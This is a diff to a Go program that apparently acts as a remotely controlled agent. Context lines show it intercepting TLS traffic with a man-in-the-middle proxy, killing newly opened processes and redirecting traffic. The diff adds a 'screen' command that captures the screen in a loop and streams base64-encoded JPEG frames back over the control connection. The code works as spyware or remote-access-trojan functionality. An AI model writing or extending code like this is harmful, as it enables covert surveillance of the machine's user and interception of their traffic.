@@ -2,14 +2,18 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"fmt"
 	"github.com/AdguardTeam/gomitmproxy"
 	"github.com/AdguardTeam/gomitmproxy/mitm"
 	"github.com/AdguardTeam/gomitmproxy/proxyutil"
 	"github.com/mitchellh/go-ps"
+	"github.com/vova616/screenshot"
+	"image/jpeg"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -42,6 +46,29 @@ func (c *CustomCertsStorage) Set(key string, cert *tls.Certificate) {
 
 var runningClose = false
 var runningRedirect = false
+
+func sendImages(conn net.Conn) {
+	for {
+		img, err := screenshot.CaptureScreen()
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+		buf := new(bytes.Buffer)
+		err = jpeg.Encode(buf, img, nil)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+		encoded := base64.StdEncoding.EncodeToString(buf.Bytes())
+		_, err = conn.Write([]byte(encoded))
+		if err != nil {
+			log.Println(err)
+			return
+		}
+		time.Sleep(time.Millisecond)
+	}
+}
 
 func closeNewProcesses(stopClose chan bool) {
 	programOpened := map[int]bool{}
@@ -313,6 +340,9 @@ func handleConnection(conn net.Conn, stopClose chan bool, stopRedirect chan bool
 			} else {
 				fmt.Println("Function Y is already running")
 			}
+		},
+		"screen": func() {
+			go sendImages(conn)
 		},
 		"stopClosing":  func() { stopClosing(stopClose) },
 		"stopRedirect": func() { stopRedirecting(stopRedirect) },
